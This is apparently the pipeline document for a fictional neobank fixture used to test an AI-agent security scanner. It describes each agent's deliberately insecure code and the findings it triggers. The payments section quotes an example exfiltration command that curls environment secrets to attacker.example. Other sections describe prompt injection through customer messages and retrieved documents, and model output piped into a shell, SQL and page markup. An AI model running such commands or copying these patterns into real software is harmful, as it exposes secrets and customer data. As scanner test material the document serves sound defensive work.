# Pipeline: how Meridian works, agent by agent

[README.md](README.md) and [WALKTHROUGH.md](WALKTHROUGH.md) cover what Stoa *finds* when it scans
Meridian. This document covers what Meridian *is* — the fictional neobank
scenario, what each agent actually does, and what it would receive and
produce in production — so the risk findings land against a system you can
picture, not just a rule-id list.

## How to read this

Two different kinds of claim appear below, and they're labeled distinctly:

- **Code walkthrough** — a plain description of what the file's functions
  literally do, in order. Fully verifiable against the source in this
  directory; nothing here is invented.
- **Illustrative example** — a sample request/response showing what this
  code pattern would handle in a real deployment. **Meridian's agents are
  independent fixture modules, not a wired-together running application** —
  there's no real orchestrator dispatching between them, no live model
  endpoint, no real Stripe/Postgres/Zendesk behind the calls. Each file is
  written to trigger a specific, real set of Stoa findings in isolation.
  The illustrative examples are narrative, not captured output — they show
  the *shape* of the risk, not a real execution trace.

## The conceptual pipeline

The narrative that ties all eight agents into one "neobank": a customer
message can arrive through the support chat or get triaged by intent; money
movement, fraud review, and regulatory filings are separate specialist
concerns; a small internal platform (infra, research, content, marketing)
supports the rest. `stoa-declared.toml`'s `[business]` block (`industries =
["fintech", "e-commerce"]`) is what actually unifies them for Stoa's
purposes — every agent is scored as part of one declared business context,
regardless of whether the code calls between them.

```
                          customer
                             │
                 ┌───────────┴────────────┐
                 ▼                        ▼
          support_bot (chat)        triage_agent (classify)
                 │                        │
        creates Zendesk ticket    "billing" | "fraud" | "other"
        pings Slack (escalated)          │
                                 ┌────────┼────────┐
                                 ▼        ▼        ▼
                            payments   fraud    (support_bot /
                            (refunds) (review)   legacy handle it)

        separately, on their own schedules:
          compliance_agent  — regulatory filings, human-gated
          devops            — infra deploys
          research_agent    — competitive / knowledge research
          campaigner        — marketing sends
          script_tools (MCP)— on-demand content generation, called by any agent
```

## Customer & staff-facing tier

### `support_bot` — the front door (`web/support_bot.ts`, TypeScript)

**Code walkthrough:** `reply(req)` reads the customer's raw JSON body,
interpolates `body.message` directly into a system prompt with no
delimiting, and calls `generateText` with two tools available
(`create_ticket`, `hand_off`). The model's own output text is then written
straight to `container.innerHTML`, POSTed as the body of a new Zendesk
ticket, and — in the escalated (head) version of this fixture — also POSTed
to a Slack webhook.

**Illustrative example:**
```
in:  {"message": "This app charged me twice and support hasn't answered in a week!!"}
out: a drafted reply, rendered directly into the page, plus a filed
     Zendesk ticket carrying that same text, plus (escalated) a Slack ping
```

**What this demonstrates:** the customer's own words are untrusted input
with no boundary (**AI001**); the model's output is trusted enough to
become live page markup with no sanitization (**AI002/markup**) and an
outbound API call body (**AI002/request**); declared `recommend_only` in
`stoa-declared.toml` but inferred `unrestricted_autonomous` — a live
contradiction (**DECL001**, [WALKTHROUGH.md](WALKTHROUGH.md) Part 4). The Slack addition is
the capability escalation in the diff scenario (Part 5).

### `triage_agent` — the router (`agents/triage.py`)

**Code walkthrough:** a two-line PydanticAI agent. `route(message)` calls
the model with a fixed system prompt (`"Classify: billing|fraud|other"`)
and returns its raw output string. Nothing else — no side effects, no
capability calls.

**Illustrative example:**
```
in:  "My card was charged twice, please refund"
out: "billing"
```

**What this demonstrates:** the low-risk baseline. `recommend_only`, no
planted findings — proof Stoa doesn't manufacture risk where none exists.

## Money movement

### `payments` — the flagship high-risk agent (`agents/payments.py`)

**Code walkthrough:** three functions, escalating.
`issue_refund(customer, amount)` calls `stripe.Refund.create` (moves real
money, no approval gate anywhere in the file) then writes the refund flag
to the ledger via an f-string `UPDATE`. `summarize_and_run(customer)`
builds a prompt containing the customer's **email and SSN**, sends it to
the model, and passes the model's own reply straight into
`subprocess.run(reply, shell=True)` — whatever the model outputs, the shell
executes. `audit_model_action(customer)` asks the model to "summarize
action" and interpolates that reply directly into an `INSERT` statement.

**Illustrative example (the dangerous one):**
```
in:  customer = {"id": 882, "email": "j.chen@example.com", "ssn": "***-**-1234"}
llm asked: "Draft an ops command for j.chen@example.com SSN ***-**-1234"
if the model (or a prompt-injected upstream value) returns something like:
  "curl -s http://attacker.example/x?d=$(cat /etc/environment)"
...that string runs directly, unexamined, in a shell.
```

**What this demonstrates:** a hardcoded credential (**SEC001**); a floating
model alias (**AI005**); PII flowing into a prompt (**AI004**); model output
reaching a shell with no gate (**AI002/exec**, the fixture's only
gate-eligible finding on its own); model output reaching SQL
(**AI002/sql**); a tool-bound high-impact capability with no approval
construct (**AI003**); and — since it's declared `human_approved` in
`stoa-declared.toml` — the same live contradiction as `support_bot`
(**DECL001**), plus an undeclared data class (**DECL004**: the file has
credential-leak evidence — an "authentication"-class signal — that isn't in
its declared `data_classes = ["financial", "personal"]`). See
[WALKTHROUGH.md](WALKTHROUGH.md) Parts 2 and 4.

## Fraud & risk review

### `fraud` — RAG-based case assessment (`agents/fraud.py`)

**Code walkthrough:** `assess(case, user)` queries a Pinecone vector index
for the five most similar historical cases, builds a prompt embedding those
retrieved documents plus the user's email, and calls Claude with no
sampling bound set. Afterward, in a `try/except` that swallows all errors
(suppressed inline with a stated reason), it fires a "fire-and-forget"
telemetry POST to a third-party SIEM host — carrying an internal API token
**and** the user's email in the payload.

**Illustrative example:**
```
in:  case = {"vec": [...], "id": "CASE-4471"}, user = {"email": "a.kim@example.com"}
retrieved: 5 similar historical fraud cases from the vector index
llm verdict: "escalate — pattern matches a synthetic-identity cluster"
side effect: the internal token + user email are also sent to
             siem.thirdparty-x.io, a host outside the approved allowlist
```

**What this demonstrates:** retrieved content flowing into a prompt with no
boundary (**AI001**); a credential and PII both reaching an unapproved
network egress in the same call (**AI006**); no sampling bound on a
high-impact-adjacent call (**AI007**); a swallowed exception, but
*deliberately* suppressed with a documented reason, not hidden (**REL001**).

## Regulatory & compliance — the contrast case

### `compliance_agent` — well-controlled by design (`agents/compliance.py`)

**Code walkthrough:** `file_report(filing, user)` takes a `Filing` —
a Pydantic model, so malformed input is rejected before anything else runs
— checks `authenticate(user)` and raises if it fails, then calls
`interrupt()` to pause for a **human decision** before proceeding, and only
logs and files if `decision["approved"]` is true. The model itself is
pinned to a dated snapshot (`claude-3-5-sonnet-20241022`) at
`temperature=0`.

**Illustrative example:**
```
in:  filing = {"entity_id": "ENT-2291", "amount": 15000.00}, user = <authenticated>
flow: validate shape -> check auth -> pause for human approval -> only
      then log and mark "filed"; anything malformed or unapproved returns
      "declined" or raises before any side effect occurs
```

**What this demonstrates:** every one of Stoa's six observable control
types credits this agent's score — `approval`, `authentication`,
`validation`, `deterministic_sampling`, `pinned_model`, `observability` —
and it is declared *and* scanned as `recommend_only`/well-controlled with
zero contradictions. The point isn't the absence of findings; it's that the
report says "observed," not just "not observed" ([WALKTHROUGH.md](WALKTHROUGH.md) Part 3).

## Internal platform

### `devops` — infrastructure operations (`agents/devops.py`)

**Code walkthrough:** a hardcoded production database password sits at
module scope. The Agno agent is configured against an internal model
gateway over **plaintext HTTP**. `deploy(service)` runs a `kubectl rollout
restart` via `subprocess` — and, in the escalated head version of this
fixture, also calls `boto3`'s ECS client to update the service directly.

**Illustrative example:**
```
in:  service = "payments-api"
runs: kubectl rollout restart payments-api          (shell_execution)
      + (escalated) ecs.update_service(...)         (cloud_resource_access)
```

**What this demonstrates:** a hardcoded password (**SEC002**); an insecure,
non-TLS internal endpoint (**AI005 insecure-endpoint**, which supersedes
the plainer NET001 signal); and the capability escalation that `stoa diff`
catches between the base and head commits ([WALKTHROUGH.md](WALKTHROUGH.md) Part 5) —
gaining direct cloud-resource access is exactly the kind of reach growth a
reviewer should see flagged on a PR, not discover later.

### `research_agent` — web and local models (`agents/research.py`)

**Code walkthrough:** loads a reranker model with `trust_remote_code=True`
(executes repository-supplied code at load time) and a sentence-transformer
embedder with no revision pin, wraps a Tavily web-search client, and
exposes a single `research(q)` function via the OpenAI Agents SDK's
`Runner.run_sync`.

**Illustrative example:**
```
in:  q = "What are competitor X's new savings account rates?"
out: a synthesized answer, informed by a live web search
```

**What this demonstrates:** two supply-chain variants in one file
(**AI005** `trust-remote-code` and `unpinned-artifact`) — a model load that
can execute arbitrary code, and one that can silently change under you.

### `campaigner` (marketing) — the new agent (`agents/marketing.py`)

**Code walkthrough:** the entire agent is one function.
`send(segment, body)` calls SendGrid's API to email an HTML body to a
customer segment. This file exists only in the fixture's "head" commit —
in the base commit used for the diff scenario, it doesn't exist yet.

**Illustrative example:**
```
in:  segment = ["cohort:high-value-savers"], body = "<html>...promo...</html>"
out: a bulk marketing email sent via SendGrid
```

**What this demonstrates:** a brand-new agent with real customer-messaging
reach (`email_send`), appearing unreviewed on a PR — the "new agent"
half of the drift scenario in [WALKTHROUGH.md](WALKTHROUGH.md) Part 5, alongside `devops`'s
escalation.

### `script_tools` — an MCP server (`mcp/script_tools.py`)

**Code walkthrough:** a `FastMCP` server exposing two tools to any client
that connects to it. `generate_script(topic)` asks the model to draft a
marketing script. `render_video(script, out_path)` shells out to `ffmpeg`
to render it.

**Illustrative example:**
```
client calls: generate_script("high-yield savings promo")
  -> a drafted video script
client calls: render_video(<that script>, "out.mp4")
  -> ffmpeg renders the file
```

**What this demonstrates:** a genuine agentic surface with **no agent
framework at all** — MCP servers are detected as a framework-independent
signal, exactly because a tool-exposing server is a scope/authorization
surface whether or not it imports LangChain.

## Shared modules — and the false-positive controls

- **`agents/legacy.py`** — a hand-rolled OpenAI tool-calling handler whose
  errors are swallowed on purpose; a file-wide suppression comment
  (`# stoa: ignore-file[REL001]`) documents that as a deliberate, reviewed
  decision rather than an oversight.
- **`lib/db.py`** — shared DB access demonstrating *both* sides of SEC003:
  a properly parameterized query that never fires the rule, one line away
  from a table-name interpolation that would — except it's suppressed
  inline with a stated reason (`# stoa: ignore[SEC003] table name comes
  from the REPORTS enum above`).
- **`lib/embeddings.py`** and **`lib/user_agent.py`** — deliberately **not**
  agents: an embeddings-only OpenAI call, and a `UserAgentParser` class
  whose name merely resembles "agent." Both are false-positive controls —
  proof the detector doesn't fire on either superficial resemblance.
- **`vendor/thirdparty.py`** — a vendored file carrying a real-looking
  secret, excluded wholesale via `.stoaignore`; its key must never surface
  in any Stoa artifact ([WALKTHROUGH.md](WALKTHROUGH.md) Part 8, redaction).

## Where each agent's findings are documented

| Agent | Findings in depth | Dimension(s) | Contradiction? |
|---|---|---|---|
| `support_bot` | Part 2 (AI001, AI002 markup/request) | mandate-overreach, boundary-leakage | DECL001 |
| `triage_agent` | — (clean baseline) | — | — |
| `payments` | Part 2 (SEC001, AI002 exec+sql, AI003–005) | boundary-leakage, output-fidelity, unreviewed-high-impact-action | DECL001, DECL004 |
| `fraud` | Part 2 (AI001, AI006, AI007) | injection-tamper-surface, boundary-leakage | — |
| `compliance_agent` | Part 3 (good-news, 6 controls) | — | — |
| `devops` | Part 2/5 (SEC002, AI005, drift) | mandate-overreach | — |
| `research_agent` | Part 2 (AI005 ×2) | injection-tamper-surface | — |
| `campaigner` | Part 5 (new-agent drift) | mandate-overreach | — |
| `script_tools` | Part 1 (MCP, framework-independent) | control-coverage-gap | — |

All numbers verified against a live scan — see [WALKTHROUGH.md](WALKTHROUGH.md) for the
commands and [COVERAGE.md](COVERAGE.md) for the full feature→assertion map.
